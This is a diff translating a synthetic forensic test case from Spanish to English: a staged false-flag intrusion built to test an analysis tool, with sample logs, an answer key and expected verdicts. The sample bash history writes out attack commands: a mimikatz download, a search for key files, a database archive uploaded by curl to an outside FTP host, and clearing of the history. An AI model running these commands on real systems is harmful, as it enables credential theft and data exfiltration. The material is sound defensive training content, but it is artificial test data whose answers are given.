@@ -1,52 +1,52 @@
 {
   "case_id": "VIGIA-2026-DEMO-004",
-  "case_name": "Operación Espejo Roto",
-  "description": "Intrusión con false flag deliberado. El atacante dejó rastros diseñados para atribuir el ataque a un grupo APT ruso conocido. VIGÍA debe detectar la incoherencia de intención.",
+  "case_name": "Operation Broken Mirror",
+  "description": "Intrusion with deliberate false flag. The attacker left traces designed to attribute the attack to a known Russian APT group. VIGÍA must detect the incoherence of intent.",
   "expected_verdict": "MALICE",
   "expected_hypothesis": "false_flag_attribution",
   "expected_mitre_ttps": ["T1036", "T1070", "T1027", "T1078"],
-  "analyst_notes": "Caso diseñado para demostrar Terceridad de Peirce: la intención detrás del acto, no solo el acto.",
+  "analyst_notes": "Case designed to demonstrate Peirce's Thirdness: the intention behind the act, not just the act itself.",
 
   "artifacts": [
     {
       "artifact_id": "LOG-001",
       "type": "system_log",
-      "source": "auth.log — servidor Ubuntu 22.04",
+      "source": "auth.log — Ubuntu 22.04 server",
       "timestamp": "2026-03-15T02:00:00.000000Z",
       "content": "Mar 15 02:00:00 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220.101.47 port 54832 ssh2\nMar 15 02:00:01 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220.101.47 port 54832 ssh2\nMar 15 02:00:02 srv-prod sshd[4822]: Accepted password for backup_user from 185.220.101.47 port 54833 ssh2\nMar 15 02:00:02 srv-prod sshd[4822]: pam_unix(sshd:session): session opened for user backup_user\n## ПОДОЗРИТЕЛЬНАЯ АКТИВНОСТЬ ОБНАРУЖЕНА ##\n## Система мониторинга: отключена ##\nMar 15 02:00:15 srv-prod sudo[4901]: backup_user : TTY=pts/0 ; PWD=/home/backup_user ; USER=root ; COMMAND=/bin/bash",
       "analyst_flags": [
-        "IP 185.220.101.47 es nodo Tor conocido — consistente con APT ruso",
-        "Strings en cirílico insertados en auth.log — inusual para logging real",
-        "Escalada a root en 13 segundos post-login — velocidad no humana"
+        "IP 185.220.101.47 is a known Tor node — consistent with Russian APT",
+        "Cyrillic strings inserted in auth.log — unusual for real logging",
+        "Escalation to root in 13 seconds post-login — non-human speed"
       ],
       "forensic_anomalies": [
-        "Los comentarios en cirílico tienen errores gramaticales: 'обнаружена' debería ser 'обнаружено' para concordar con 'активность' en contexto técnico",
-        "auth.log no genera comentarios con ## — es formato de script, no de syslog",
-        "Timestamp con precisión de segundos exactos: 02:00:00, 02:00:01, 02:00:02 — demasiado regular para tráfico real"
+        "The Cyrillic comments have grammatical errors: 'обнаружена' should be 'обнаружено' to agree with 'активность' in technical context",
+        "auth.log does not generate comments with ## — this is script format, not syslog format",
+        "Timestamps with exact-second precision: 02:00:00, 02:00:01, 02:00:02 — too regular for real traffic"
       ]
     },
     {
       "artifact_id": "LOG-002",
       "type": "bash_history",
-      "source": "/root/.bash_history — recuperado de imagen forense",
+      "source": "/root/.bash_history — recovered from forensic image",
       "timestamp": "2026-03-15T02:01:00.000000Z",
       "content": "whoami\nid\nuname -a\nwget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip\nunzip mimikatz_trunk.zip\n./mimikatz.exe\nls /etc/shadow\ncat /etc/passwd\nfind / -name '*.key' 2>/dev/null\n# Задание выполнено. Цель: финансовые данные.\ntar czf /tmp/exfil.tar.gz /var/lib/postgresql/\ncurl -T /tmp/exfil.tar.gz ftp://185.220.101.47/uploads/\nrm -rf /tmp/exfil.tar.gz\nhistory -c",
       "analyst_flags": [
-        "Mimikatz es herramienta asociada a APT rusos (Fancy Bear, Cozy Bear)",
-        "Comentario en ruso confirma origen aparente",
-        "Exfiltración al mismo IP que el login"
+        "Mimikatz is a tool associated with Russian APTs (Fancy Bear, Cozy Bear)",
+        "Russian comment confirms apparent origin",
+        "Exfiltration to the same IP as the login"
       ],
       "forensic_anomalies": [
-        "mimikatz.exe en servidor Linux — el binario no funciona en Linux sin Wine, nunca fue ejecutado realmente",
-        "history -c al final pero el archivo existe — contradicción: si borraste el historial, ¿cómo existe este archivo?",
-        "El comentario en ruso 'Задание выполнено' (misión cumplida) es demasiado cinematográfico — los operadores reales no comentan sus comandos",
-        "wget de GitHub con URL exacta de release — un APT usaría infraestructura propia, no GitHub público"
+        "mimikatz.exe on a Linux server — the binary does not run on Linux without Wine, it was never actually executed",
+        "history -c at the end but the file exists — contradiction: if you cleared history, how does this file exist?",
+        "The Russian comment 'Задание выполнено' (mission accomplished) is too cinematic — real operators do not comment their commands",
+        "wget from GitHub with exact release URL — an APT would use its own infrastructure, not public GitHub"
       ]
     },
     {
       "artifact_id": "META-001",
       "type": "file_metadata",
-      "source": "Metadatos de /tmp/exfil.tar.gz — recuperado de slack space",
+      "source": "Metadata of /tmp/exfil.tar.gz — recovered from slack space",
       "timestamp": "2026-03-15T02:03:00.000000Z",
       "content": {
         "filename": "exfil.tar.gz",
@@ -58,29 +58,29 @@
         "permissions": "0644"
       },
       "analyst_flags": [
-        "Archivo de exfiltración encontrado en slack space",
-        "Tamaño cero — posiblemente borrado antes de transferir"
+        "Exfiltration file found in slack space",
+        "Zero size — possibly deleted before transfer"
       ],
       "forensic_anomalies": [
-        "MD5 d41d8cd98f00b204e9800998ecf8427e es el hash de un archivo VACÍO — no hubo exfiltración real",
-        "created == modified con precisión de segundos exactos — timestamps manipulados",
-        "Permisos 0644 en archivo supuestamente secreto de exfiltración — un operador real usaría 0600"
+        "MD5 d41d8cd98f00b204e9800998ecf8427e is the hash of an EMPTY file — no real exfiltration occurred",
+        "created == modified with exact-second precision — manipulated timestamps",
+        "Permissions 0644 on a supposedly secret exfiltration file — a real operator would use 0600"
       ]
     },
     {
       "artifact_id": "NET-001",
       "type": "network_capture_summary",
-      "source": "tcpdump resumen — interfaz eth0",
+      "source": "tcpdump summary — eth0 interface",
       "timestamp": "2026-03-15T02:00:00.000000Z",
       "content": "02:00:00.000 SSH connection established: 185.220.101.47:54833 -> 10.0.0.5:22\n02:00:02.000 SSH authenticated: backup_user\n02:01:00.000 HTTP GET github.com/gentilkiwi/mimikatz [200 OK, 8.2MB]\n02:02:00.000 FTP connection attempt: 10.0.0.5 -> 185.220.101.47:21 [CONNECTION REFUSED]\n02:03:00.000 SSH session closed: duration=180s, bytes_sent=45230, bytes_received=8589934",
       "analyst_flags": [
-        "Conexión FTP fallida — el servidor de exfiltración rechazó la conexión",
-        "SSH session de exactamente 180 segundos — 3 minutos exactos"
+        "Failed FTP connection — the exfiltration server refused the connection",
+        "SSH session of exactly 180 seconds — exactly 3 minutes"
       ],
       "forensic_anomalies": [
-        "FTP CONNECTION REFUSED — no hubo exfiltración real, confirma MD5 vacío",
-        "Duración SSH de exactamente 180 segundos — imposiblemente preciso para actividad humana",
-        "bytes_received=8589934 es exactamente 8MB+algo — coincide con el zip de mimikatz descargado, pero nada más fue transferido"
+        "FTP CONNECTION REFUSED — no real exfiltration occurred, confirmed by empty MD5",
+        "SSH duration of exactly 180 seconds — impossibly precise for human activity",
+        "bytes_received=8589934 is exactly 8MB+something — matches the downloaded mimikatz zip, but nothing else was transferred"
       ]
     }
   ],
@@ -88,19 +88,19 @@
   "ground_truth": {
     "actual_attacker": "insider_threat_or_local_actor",
     "actual_objective": "frame_russian_apt",
-    "real_damage": "none — el ataque fue una operación de desinformación forense",
+    "real_damage": "none — the attack was a forensic disinformation operation",
     "exfiltration_occurred": false,
     "mitre_actual": {
-      "T1036": "Masquerading — uso de herramientas y strings asociados a APT ruso",
-      "T1070": "Indicator Removal — history -c + archivo vacío + timestamps manipulados",
-      "T1027": "Obfuscated Files — inserción de cirílico para desviar análisis",
-      "T1078": "Valid Accounts — uso de cuenta backup_user legítima"
+      "T1036": "Masquerading — use of tools and strings associated with Russian APT",
+      "T1070": "Indicator Removal — history -c + empty file + manipulated timestamps",
+      "T1027": "Obfuscated Files — insertion of Cyrillic to divert analysis",
+      "T1078": "Valid Accounts — use of legitimate backup_user account"
     }
   },
 
   "peirce_expected": {
-    "firstness": "Strings en cirílico, herramienta APT conocida, IP Tor — apariencia de ataque ruso",
-    "secondness": "Mimikatz.exe en Linux no ejecutable, historial que se autocontradice, exfiltración fallida con archivo vacío — los hechos no sostienen la narrativa",
-    "thirdness": "La acumulación de 'pruebas perfectas' que se contradicen entre sí revela intención de fabricar evidencia de atribución. El atacante real sabía lo suficiente para imitar la superficie de un APT pero no los detalles operacionales."
+    "firstness": "Cyrillic strings, known APT tool, Tor IP — appearance of a Russian attack",
+    "secondness": "mimikatz.exe non-executable on Linux, self-contradicting history, failed exfiltration with empty file — the facts do not support the narrative",
+    "thirdness": "The accumulation of 'perfect evidence' that contradicts itself reveals intent to fabricate attribution evidence. The real attacker knew enough to mimic the surface of an APT but not the operational details."
   }
 }
